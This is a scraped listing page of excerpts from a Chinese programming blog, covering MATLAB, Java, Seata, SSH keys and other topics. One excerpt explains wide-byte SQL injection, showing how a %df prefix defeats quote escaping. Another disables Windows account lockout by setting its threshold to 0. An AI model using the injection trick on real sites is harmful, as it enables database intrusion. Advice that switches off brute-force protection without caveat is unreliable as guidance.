T=0.08; % 取样间隔 t=-2:T:2; % 时域截取范围 f=heaviside(t+0.8)-heaviside(t-1.2); W1=pi/T; % 频谱分析范围 N=200; % 频域点数2N+1 k=-N:N; W=k*W1/(2*N+1); % W为频率采样点 F=f*exp(-j*t'*W); % 求F(jw) subplot(2,1,1) plot(W/2/pi,abs(F)); xlabel('f(Hz)');ylabel('幅度'); title('幅度频谱'); subplot(2,1,2) plot(W/2/pi,angle(F)/pi*180) xlabel('f(Hz)');ylabel('相角(度）'); title('相位频谱'); 3、设f(t)为第1题的矩形脉冲，选用一个具有适当频率的余弦信号cos⁡(ω_c t)（请参考课件第98页例4-5-6），用MATLAB画出f(t)cos⁡(ω_c t)的频谱（幅度谱和相位谱合二为一，可自行选择符号计算和数值计算方式，若采用数值计算，需对第2题给出的参考程序略作修改）。结合课件例4-5-6，讨论“频谱搬移”（幅度调制）的概念及其实现方法。f(t)cos⁡(ω_c t)其实也可以视为f(t)和cos⁡(ω_c t)在时域相乘，根据频域卷积定理（教材式4.5-28）也能得到相同的结论，请基于频域卷积定理推导f(t)cos⁡(ω_c t)的傅里叶变换（参见课件第123页例4-6-0）。
4、从时域的角度来看，对上一题的f(t)cos⁡(ω_c t)还有另外一种解释：它是利用门函数截取了余弦信号cos⁡(ω_c t)的一段样本。而对这段样本进行傅里叶变换，所得到的频谱上题所示。但是，由周期信号的傅里叶变换可知，cos⁡(ω_c t)的理论频谱应该如教材图4.7-1(a)中所示的两个频域冲激。也就是说，如果只截取cos⁡(ω_c t)的一段样本，来计算cos⁡(ω_c t)的频谱，其结果是不准确的！这种不准确性也称为“测不准原理”，它反映了采用观测的方法来分析信号的频谱所面临的局限性。试分析讨论：①比较上一题求得的f(t)cos⁡(ω_c t)频谱与cos⁡(ω_c t)理论频谱之间的区别与联系。②通过改变矩形脉冲的宽度，截取不同长度的cos⁡(ω_c t)样本，用MATLAB分别分析其频谱，比较不同长度样本频谱的差异，分析若想改善频谱分析的准确性，应该如何选取样本长度？
5、分别针对前面各题的矩形脉冲f(t)、余弦信号cos⁡(ω_c t)以及f(t)cos⁡(ω_c t)，分别进行时域尺度变换（变换系数自定），采用MATLAB符号或者数值计算，求尺度变换后的频谱。根据结果总结时域尺度变换对频谱的影响，并讨论这一结论对于确定通信系统的带宽有何意义？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd1b33201d8875a3816268fabd029664/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7a696107fc4c69136e33bb791045e05/" rel="bookmark">
			远程桌面连接Windows实例，提示“为安全考虑，已锁定该用户账户，原因是登录尝试或密码更改尝试过多”错误解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题描述 使用远程桌面连接Windows系统的ECS实例，提示“为安全考虑，已锁定该用户账户，原因是登录尝试或密码更改尝试过多”错误，具体报错信息如下图所示。
二、问题原因 Windows系统的ECS实例系统组策略中配置了用户锁定策略，在登录时输入错误的密码次数过多，该账户会被锁定，导致远程桌面无法登录。
三、解决方案 可以修改Windows实例组策略账户锁定阈值为0以解决该问题。本文以Windows Server 2019操作系统为例，其他操作系统操作步骤类似。
通过VNC连接Windows实例。 无法使用Workbench和第三方远程连接工具（例如PuTTY、Xshell、SecureCRT等）连接实例时，可以通过VNC远程连接方式登录实例.
具体方法，不同服务商，提供的控制台有所不同，请自行查阅。
在系统左下角搜索对话框中输入gpedit.msc命令，然后单击确定，进入本地组策略编辑器页面。 3、在本地组策略编辑器页面中，选择计算机配置 &gt; Windows设置 &gt; 安全设置 &gt; 账户策略 &gt; 账户锁定策略。
4、在账户锁定策略页面，双击账户锁定阈值，进入账户锁定阈值 属性窗口。
5、在账户锁定阈值 属性窗口，将账户不锁定阈值修改为0，单击确定。
6、重新远程桌面连接Windows实例。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acf8424bf06ea95093733064425d703d/" rel="bookmark">
			TCP通讯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，创建类 1.ChatSocketServer类
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
/**
* 发送消息线程
*/
class Send extends Thread{
private Socket socket;
public Send(Socket socket){
this.socket =socket;
}
@Override
public void run() {
this.sendMsy();
}
/**
* 发送消息
*/
private void sendMsy(){
Scanner scanner =null;
PrintWriter pw =null;
try{
scanner =new Scanner(System.in);
pw =new PrintWriter(this.socket.getOutputStream());
while(true){
String str =scanner.nextLine();
pw.println(str);
pw.flush();
}
}catch (Exception e){
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acf8424bf06ea95093733064425d703d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba047813fca4ddba1fc4f379bd382065/" rel="bookmark">
			SSH秘钥登录服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、查看本机 ssh 公钥，生成公钥 1.通过命令窗口
a. 打开你的 git bash 窗口
b. 进入 .ssh 目录：cd ~/.ssh
c. 找到 id_rsa.pub 文件：ls
d. 查看公钥：cat id_rsa.pub 或者 vim id_rsa.pub
git–查看本机 ssh 公钥，生成公钥
二、手动将 ssh 公钥添加到服务器 方法1：自动将ssh密钥复制到服务器 用户端:第一种方法是用户将其个人计算机的公钥复制到远程服务器上的授权密钥列表中。
这里，假设你能够使用 ssh 登录到远程服务器 user_name@ip_of_server，它会询问你的帐户密码，然后您进入服务器。
如果你将公钥添加到服务器，那么就应该可以在不输入密码的情况下登录。
OpenSSH 提供了一个称为 ssh-copy-id 的工具，用于将 ssh 公钥复制到远程系统，它还可以创建所需的目录和文件。如下命令：
ssh-copy-id -i ~/.ssh/id_rsa.pub YOUR_USER_NAME@IP_ADDRESS_OF_THE_SERVER 出现系统提示时，输入远程服务器上用户帐户的密码，公钥就会自动复制到远程服务器上的相应文件夹中。
上述命令中有个路径：~/.ssh/id_rsa.pu，这是 ssh 公钥的默认位置，大家需要根据自己实际情况修改这个路径。
方法2：手动将 ssh 公钥添加到服务器 管理员端：假设你是系统管理员，你的服务器不允许通过密码进行 ssh 登录，那么访问服务器的唯一方法是使用 ssh 公钥身份验证。
在这种情况下，你可以要求最终用户提供其公钥。现在，你可以做的是创建 .ssh/authorized_keys 目录，然后在这里复制公钥。
步骤1：获取公钥 键入如下命令，要求用户提供公钥：
cat ~/.ssh/id_rsa.pub 它将显示一个以 ssh-rsa 开头的长字符串：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba047813fca4ddba1fc4f379bd382065/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfa51a98f4c9cc6736da694d10933d09/" rel="bookmark">
			小狐狸ChatGPT付费创作系统小程序端开发工具提示打开显示无法打开页面解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最新版2.6.7版下载：https://download.csdn.net/download/mo3408/88656497
很多会员在上传小程序前端时经常出现首页无法打开的情况，错误提示无法打开该页面，不支持打开，这种问题其实就是权限问题，页面是通过调用web-view访问，说明业务域名有问题，很多都是合法域名加了，但忘了加业务域名导致。
小程序后台小程序类目选择：工具 -&gt; 办公，小程序后台request合法域名、uploadFile合法域名、downloadFile合法域名、业务域名必须设置加上，如果出现错误提示认真检查参数。
加上业务域名后正常，验证文件上传至网站目录时是需要上传至public目录下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2aa788e2e5a790f197b0bd61e1d4a9d/" rel="bookmark">
			给数组新增一项时使用的key值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们给数组新新增一项时,我们可以使用当前时间戳来作为它的key值
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b377f5bd1e44ef5581083f9a4403fa4/" rel="bookmark">
			cesium实现区域贴图及加载多个gif动图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、cesium加载多个gif动图 Cesium的Billboard支持单帧纹理贴图，如果能够将gif动图进行解析，获得时间序列对应的每帧图片，然后按照时间序列动态更新Billboard的纹理，即可实现动图纹理效果。为此也找到了相对于好一点的第三方库libgif能够将gif转化为一帧帧图像，正好能够满足我们的需求！！！
let gifImgList = []; data?.forEach((tag) =&gt; { let url = huangren; let gifDiv = document.createElement("div"); let gifImg = document.createElement("img"); // gif库需要img标签配置下面两个属性 gifImg.setAttribute("rel:animated_src", url); gifImg.setAttribute("rel:auto_play", "1"); // 设置自动播放属性 gifDiv.appendChild(gifImg); let superGif = new SuperGif({ gif: gifImg, }); gifImgList.push(superGif); }); data?.forEach((tag, ind) =&gt; { gifImgList[ind].load(function () { onViewer.entities.add({ _content: tag, position: new Cesium.Cartesian3.fromDegrees( Number(tag.longitude), Number(tag.latitude), 100 ), billboard: { //图标 image: new Cesium.CallbackProperty(() =&gt; { // 转成base64,直接加canvas理论上是可以的，这里设置有问题 return gifImgList[ind].get_canvas().toDataURL(); }, false), scale: 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b377f5bd1e44ef5581083f9a4403fa4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/326a90edb964f2ce41161a57ad6afd92/" rel="bookmark">
			DatePicker设置默认日期时使用moment
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		moment().subtract(1, 'days'); // 当前时间减1天
大家可以去看:moment常用操作_moment().subtract()-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f871646f41f29da75249303cc201f68d/" rel="bookmark">
			chmod修改文件权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux系统的用户账户：
超级用户root（0）
程序用户（1~499）
普通用户（500~65535）
chown 修改文件的所有者
chown 用户名 文件名 chmod 可修改文件权限
chmod 修改权限 文件名 chmod -R 修改权限 文件及递归 rwx
r(读取)：对文件而言，该用户具有读取文件内容的权限；对目录来说，该用户具有浏览目录的权限。
w(写入)：对文件而言，该用户具有新增、修改文件内容的权限；对目录来说，该用户具有删除、移动目录内文件的权限
x(执行)：对文件而言，该用户具有执行文件的权限；对目录来说，该用户具有进入目录的权限
比如
755
7： 4+2+1 rwx 所有者具有读取、写入、执行权限；
5: 4+0+1 r-x 同组用户具有读取、执行权限但没有写入权限；
5: 4+0+1 r-x 其他用户具有读取、执行权限但没有写入权限；
Linux基础命令-chmod修改文件权限
LINUX用户和用户组
Linux权限详解
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3515d1e91151f1e81b43c1d0cb7eb16/" rel="bookmark">
			Seata源码——TCC模式解析03
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCC模式常见问题 在分布式系统中，随时随地都需要面对网络超时，网络重发和服务器宕机等问题。所以分布式事务框架作为搭载在分布式系统之上的一个框架型应用也绕不开这些问题。具体而言，有以下常见问题：
1.幂等处理
2.空回滚
3.资源悬挂
参考 ：https://developer.aliyun.com/article/1053736#
Seata如何解决Tcc常见问题的 使用 在LocalTCC模式下，可以选择开启useTCCFence=true，通过seata框架内置的tcc分支事务状态表解决TCC的三大问题
@TwoPhaseBusinessAction(name = “local-tcc-action”, useTCCFence = true // 是否启用TCCFence，由SeataTCC框架处理TCC三大问题（幂等、悬挂、空回滚）
原理解析 在执行prepare、commit、rollback业务方法之前，用tccFenceLog事务状态表拦截非法请求。
在try阶段，TCCFenceHandler首先开启事务保证与业务在同一个事务中提交，然后插入一条tcc_fence_log状态为STATUS_TRIED，最后执行业务try方法。
Try阶段 TCCFenceHandler
public static Object prepareFence(String xid, Long branchId, String actionName, Callback&lt;Object&gt; targetCallback) { // 开启事务 return transactionTemplate.execute(status -&gt; { try { Connection conn = DataSourceUtils.getConnection(dataSource); // 插入tcc_fence_log status = STATUS_TRIED boolean result = insertTCCFenceLog(conn, xid, branchId, actionName, TCCFenceConstant.STATUS_TRIED); LOGGER.info("TCC fence prepare result: {}. xid: {}, branchId: {}", result, xid, branchId); if (result) { // 业务try方法 return targetCallback.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3515d1e91151f1e81b43c1d0cb7eb16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32c5dffca6f52c7da28ed8caa7fffdf8/" rel="bookmark">
			Seata源码——TCC模式解析02
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初始化 在SpringBoot启动的时候通过自动注入机制将GlobalTransactionScanner注入进ioc而GlobalTransactionScanner继承AbstractAutoProxyCreatorAbstract 在postProcessAfterInitialization阶段由子类创建代理TccActionInterceptor
GlobalTransactionScanner
protected Object wrapIfNecessary(Object bean, String beanName, Object cacheKey) { // ... // 注册RM、判断是否需要代理 if (TCCBeanParserUtils.isTccAutoProxy(bean, beanName, applicationContext)) { // tcc_fence_log清理任务 TCCBeanParserUtils.initTccFenceCleanTask(TCCBeanParserUtils.getRemotingDesc(beanName), applicationContext); // 代理逻辑TccActionInterceptor interceptor = new TccActionInterceptor(TCCBeanParserUtils.getRemotingDesc(beanName)); } // ... } TCC下的Bean类型 TCC模式下有三种特殊的SpringBean。
1.LocalTCC注释接口的Bean：如案例中的LocalTccAction；
2.RPC服务提供方ServiceBean：如Dubbo中被@DubboService注释的服务实现类，如案例中的StorageTccActionImpl；
3.RPC服务消费方ReferenceBean：如Dubbo中被@DubboReference注入的Bean，如案例中的StorageTccAction；
判断是否需要代理 TCCBeanParserUtils
public static boolean isTccAutoProxy(Object bean, String beanName, ApplicationContext applicationContext) { // dubbo:service 和 LocalTCC 注册为 RM boolean isRemotingBean = parserRemotingServiceInfo(bean, beanName); RemotingDesc remotingDesc = DefaultRemotingParser.get().getRemotingBeanDesc(beanName); if (isRemotingBean) { if (remotingDesc !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32c5dffca6f52c7da28ed8caa7fffdf8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/036b030e503189a20099d399479ccb9f/" rel="bookmark">
			Seata源码——TCC模式使用01
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是TCC TCC 是分布式事务中的二阶段提交协议，它的全称为 Try-Confirm-Cancel，即资源预留（Try）、确认操作（Confirm）、取消操作（Cancel），他们的具体含义如下：
Try：对业务资源的检查并预留。
Confirm：对业务处理进行提交，即 commit 操作，只要 Try 成功，那么该步骤一定成功。
Cancel：对业务处理进行取消，即回滚操作，该步骤回对 Try 预留的资源进行释放。
TCC 是一种侵入式的分布式事务解决方案，以上三个操作都需要业务系统自行实现，对业务系统有着非常大的入侵性，设计相对复杂，但优点是 TCC 完全不依赖数据库，能够实现跨数据库、跨应用资源管理，对这些不同数据访问通过侵入式的编码方式实现一个原子操作，更好地解决了在各种复杂业务场景下的分布式事务问题。
Seata官网介绍 https://seata.io/zh-cn/docs/dev/mode/tcc-mode
特点 侵入性比较强，并且需要自己实现相关事务控制逻辑。
在整个过程基本没有锁，性能较强。
案例 order 服务 Order服务同时担任TM和RM角色。
TM角色下@GlobalTransactional负责管理全局事务。
@GlobalTransactional //开启全局事务 @Override public void create(Order order) { orderService.prepareCreateOrder(null, order.getId(), order.getUserId(), order.getProductId(), order.getCount(), order.getMoney()); } Seata 实现 TCC 操作需要定义一个接口，在接口中添加以下方法：
Try - prepareCreateOrder() --方法的名称可以根据实际业务指定
Confirm - commit()
Cancel - rollback()
RM角色下LocalTccAction被@LocalTCC+@TwoPhaseBusinessAction标注，作为一个TCC资源向TC注册，管理分支事务注册、提交和回滚
@LocalTCC public interface OrderService { /* 第一阶段的方法 通过注解指定第二阶段的两个方法名 BusinessActionContext 上下文对象，用来在两个阶段之间传递数据 @BusinessActionContextParameter 注解的参数数据会被存入 BusinessActionContext */ @TwoPhaseBusinessAction(name = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/036b030e503189a20099d399479ccb9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18b17321e45223e6c04472eac5423b70/" rel="bookmark">
			BasicForma的schemas中不展示的属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在实际开发中,我们在使用vben admin的Form表单组件时,我们不需要某一项展示出来,而只是在点提交时,需要用到这一项的值,那么就要用到show这个属性了,
将它设置为false, 如下:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edd2a1a77ea542b8d08e4c9d99051330/" rel="bookmark">
			基于鲸鱼算法WOA优化深度混合核极限学习机DHKELM分类预测，WOA-DHKELM数据分类预测，多特征输入模型。优化参数为DHKELM的各种核参数、9个参数系数。多特征输入单输出的二分类及多
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		clc;
close all;
clear;
format compact;
format short;
warning off
addpath DHKELM_path\
%% 你的数据导入 res=xlsread('数据集.xlsx'); % 多分类
智能算法及其模型预测
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47e915a5cec4a85995f607a6a4cc8df9/" rel="bookmark">
			深度学习中用来训练的train.py 探究学习（1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		train.py是深度学习中用来训练模型的脚本文件。它通常包含了以下主要功能：
加载数据集：train.py会加载训练数据集，通常是将数据集划分为训练集和验证集，并进行数据预处理。
定义模型：train.py会定义深度学习模型的结构，包括网络的层次结构、激活函数、损失函数等。
设置训练参数：train.py会设置训练网络的一些参数，如训练的轮数、学习率、批量大小等。
训练模型：train.py会使用训练数据集对模型进行训练，通过反向传播算法更新模型的参数，使得模型能够逐渐优化。
保存模型：train.py会保存训练好的模型，以便后续使用。
可视化训练过程：train.py通常会使用可视化工具，如TensorBoard，来展示训练过程中的损失函数变化、准确率等指标。
测试模型：train.py可能会在训练过程中周期性地对模型进行测试，以评估模型的性能。
输出训练结果：train.py会输出训练过程中的一些结果，如训练损失、验证损失、准确率等。
调整模型参数：train.py可能会根据训练结果调整模型的参数，如学习率衰减、增加正则化等。
结束训练：train.py会在训练完成后结束训练过程，并输出最终的训练结果。
以下是一个train.py的示例代码：
# 加载数据集 train_dataset = load_dataset(train_data_path) val_dataset = load_dataset(val_data_path) # 定义模型 model = create_model() # 设置训练参数 epochs = 10 learning_rate = 0.001 batch_size = 32 # 定义损失函数和优化器 criterion = nn.CrossEntropyLoss() optimizer = torch.optim.Adam(model.parameters(), lr=learning_rate) # 训练模型 for epoch in range(epochs): for batch_data in train_dataset: inputs, labels = batch_data optimizer.zero_grad() outputs = model(inputs) loss = criterion(outputs, labels) loss.backward() optimizer.step() # 保存模型 torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47e915a5cec4a85995f607a6a4cc8df9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c3d400d87dde8ee29556541b83c152c/" rel="bookmark">
			宽字节注入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理：
mysql在使用gbk编码的时候，会认为两个字符是一个汉字，我们在过滤‘的时候，往往就是将‘转换为\’，所以我们只需要将‘前面的\去除
思路：
1.%df去掉\
原因是urlencode(‘\)=%5c%27,我们在前面加上%df的话就会变成%df%5c%27纳闷前面的%df%5c会当成是汉字%27就留下来了
2.将\直接过滤掉
其实就是构造注释，%**%5c%5c%27后面的%5c 会被前面的%5c 给注释掉
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92342f473e56b1681f88be0514846e8b/" rel="bookmark">
			改变uTools的插件安装/数据目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. uTools安装 uTools是一款非常便捷的软件，它内置有许许多多的插件，可以方便我们的日常办公和学习。
uTools官方网址
2. 修改安装路径 uTools默认是安装在C盘的，我们可以通过给uTools文件夹创建一个软连接来改变文件的实际位置，下面就是具体演示：
退出uToolswin+R 后输入 %APPDATA%（或者通过快捷方式找到安装目录）找到uTools文件夹（假设目前uTools文件夹的路径是C:\Users\fakeuser\AppData\Roaming\uTools）选中uTools文件夹，剪切到你想要的任何位置（你没看错是剪切）（假设剪切后uTools文件夹的路径为 D:\fakepath\uTools）win+R 后输入 cmd，打开cmd窗口在cmd窗口中输入mklink /d "C:\Users\fakeuser\AppData\Roaming\uTools" "D:\fakepath\uTools"，回车（记得替换路径） 完成上述操作后，你会发现原来的AppData目录中出现了一个类似快捷方式的uTools目录，但是仅仅是类似，实际上是创建了一个软链接，普通的快捷方式是没法达到这个目的的。
这样就能让uTools不占用C盘空间，将数据储存到其他地方了。
3. Reference https://blog.csdn.net/H_jrqn/article/details/126525311
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/702127b56399d7c17a69cfc686c8f3ad/" rel="bookmark">
			【JavaWeb学习笔记】15 - jQuery
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目代码 https://github.com/yinhai1114/JavaWeb_LearningCode/tree/main/jquery
目录
零、官方文档
一、jQuery基本介绍
1.基本介绍
2.原理图
二、JQuery入门使用
1.下载JQuery
2.jQuery快速入门
三、jQuery对象
1.什么是jQuery对象?
2.DOM对象转换成jQuery对象
3.jQuery对象转成DOM对象
四、jQuery选择器
1.jQuery选择器介绍
2.基本选择器
3.层次选择器
4.奇数选择器 - 基础过滤选择器
5.内容过滤选择器
6.可见度过滤选择器
7.属性过滤选择器
8.子元素过滤选择器
9.表单对象属性过滤选择器
10.表单选择器
五、jQuery课后作业
六、jQuery的DOM操作
1.查找节点,修改属性
2.创建节点
3.删除节点
4.复制节点
5.替换节点
6.属性操作
7.样式操作
8.获取HTML,文本和值
9.常用遍历节点方法
10.css-dom操作
七、多选框案例演示
八、jQuery中的事件--加载DOM
九、本章课后作业
零、官方文档 jQuery 教程
jQuery API 中文文档 | jQuery API 中文在线手册 | jquery api 下载 | jquery api chm
一、jQuery基本介绍 1.基本介绍 1. jQuery是一个快速的，简洁的javaScript库，使用户能更方便地处理HTML，css，dom
2.提供方法、events、选择器，并且方便地为网站提供AJAX交互
3.其宗旨是 -- WRITE LESS，DO MORE，写更少的代码,做更多的事情.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/702127b56399d7c17a69cfc686c8f3ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e6c14f83d6a7c7d4404276c065b02d0/" rel="bookmark">
			【Java学习笔记】5-变量，以及逻辑符号、整型、浮点数据类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
〇、JAVA API文档，中文在线文档:https://www.matools.com
一、变量的基础逻辑
1.变量的赋值，
2.变量三要素 3.变量再同一作用域内不能重名
二、+ 的使用
1.当左右都是数值型，则做加法运算 当一方为字符串时做拼接运算
三、数据类型
（1）基本数据类型
（2）引用数据类型
四、整数类型
五、整数类型
1.int为四个字节，JAVA的整型常量默认为int，声明long型常量后需要加入l或者L
2.JAVA中变量常声明为int
3.bit是计算机最小储存单位，byte计算机中最基础的储存单元，1byte=1bit
六、浮点类型
1.float单精度浮点型，占用4个字节，double双精度浮点型，占用8个字节
2.浮点数在机器中储存形式为 浮点数=符号位+指数位+尾数位（尾数位可被省略）
3.JAVA的浮点型常量默认为double，需要声明为float时，需在后面加上f或者F
5.通常情况下，应该使用double型，因为它比float更精确
6.浮点型的使用陷阱
〇、JAVA API文档，中文在线文档:https://www.matools.com 一、变量的基础逻辑 1.变量的赋值， 可以直接对数值赋予变量，int a=10;或者声明变量之后再赋值int a; a=10;
2.变量三要素 变量名 数值 数据类型
3.变量再同一作用域内不能重名 即前行定义int a，后则不能再定义int a，同一作用域指的是一个公开类内，新建的class类也可以定义int a
二、+ 的使用 1.当左右都是数值型，则做加法运算 当一方为字符串时做拼接运算 System.out.println(100 + 98);
System.out.println("100" + 98);
System.out.println(100 + 3 + "hello");
三、数据类型 （1）基本数据类型 1.数值型 整数类型，存放整数byte[1] short[2] int[4] long[8]
浮点类型 float[4] double[8]
2.字符型
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e6c14f83d6a7c7d4404276c065b02d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04cfa0ee0833190eb9c8ad7a8d23b947/" rel="bookmark">
			【Java学习笔记】 17 本章作业，数组的类型，拷贝赋值，引用赋值，
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.
​编辑
2.
3.
4.
5. 这个还是比较抽象的 建议多看这个和第16的笔记
​编辑
6.
7.
国庆快乐，玩了六七天玩爽了，接着复习一下做一下作业然后接着学
=w=
1. A 错，char赋给String；B对；C错，没有[]； D 对；E错，后面的[]不能写具体的数字； 2. 对于布尔类型，有默认值false，所以不执行if 所以输出为blue。
3. 输出 1 3 5 7当输出完7之后，执行判断 &gt; 5，随后跳出程序结束
4. 可变数组，所以需要两个数组，一个变，一个引用地址。
import java.util.Scanner; public class HomeWork04{ public static void main(String[] args){ int arr[] = {10, 12, 45, 90};//初始数组 System.out.print("目前数组为"); for(int i = 0; i &lt; arr.length; i++){ System.out.print(arr[i] + "\t");//循环打印数组，告诉用户数组为 } while(true){//输入判断是否接着运行，当执行一次后输入为0结束程序 //可以考虑使用do whlie int arr2[] = new int[arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04cfa0ee0833190eb9c8ad7a8d23b947/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/585e061362623156fa6add0f653724ba/" rel="bookmark">
			【Java学习笔记】19 成员方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、基本介绍
二、快速入门
三、方法调用的机制
总结
四、成员方法的好处
五、成员方法的定义
返回数据类型
方法名
形参列表
方法体
方法调用
六、成员方法的练习
1.编写方法判断奇偶
2.打印对应列行数的字符
七、成员传参的机制
1.基本数据类型
2.引用类型
八、练习 克隆对象
一、基本介绍 在某些情况下，我们需要定义成员方法。比如人类：除了有属性以外，人类还有一些行为：说话，跑步；这时候就需要用成员方法才能完成，对Person类完善
二、快速入门 1）
public class Object01{ public static void main(String[] args){ //方法使用 先创建对象 然后调用方法即可 Person p1 = new Person(); p1.speak();//调用方法 程序执行到这里会去person类里找speak方法 } } class Person{ String name; int age; //public 表示是公开的 void表示方法没有返回值 //speak() 表示方法名 ()表示形参列表 //{}方法体，可以写我们要执行的代码 //System.out...表示方法内容，输出一句话 //方法写好后，不去调用不会输出语句 public void speak(){ System.out.println("我是一个好人"); } } 2）
public class Method01{ public static void main(String[] args){ p1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/585e061362623156fa6add0f653724ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fed776d15c46a1171aaee4c1b81a8905/" rel="bookmark">
			【微服务】springboot整合kafka-stream使用详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前言
二、kafka stream概述
2.1 什么是kafka stream
2.2 为什么需要kafka stream
2.2.1 对接成本低
2.2.2 节省资源
2.2.3 使用简单
2.3 kafka stream特点
2.4 kafka stream中的一些概念
2.5 Kafka Stream应用场景
三、环境准备
3.1 搭建zk
3.1.1 自定义docker网络
3.1.2 拉取zk镜像
3.1.3 启动zk容器
3.2 搭建kafka
3.2.1 下载kafka并解压
3.2.2 修改配置文件
3.2.3 启动kafka服务
3.3 kafka测试
3.3.1 创建topic
3.3.2 开启kafka生产端控制台
3.3.3 开启kafka消费端控制台
3.4 java客户端集成kafka测试
四、kafka stream 使用
4.1 前置准备
4.2 kafka stream应用开发步骤
4.2.1 步骤1：创建Kafka Streams 实例
4.2.2 步骤2：指定输入与输出topic
4.2.3 步骤3：启动Kafka Streams 实例
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fed776d15c46a1171aaee4c1b81a8905/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48d26fd67022086113124922071dccc7/" rel="bookmark">
			【STM32】STM32学习笔记-TIM定时中断(13)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
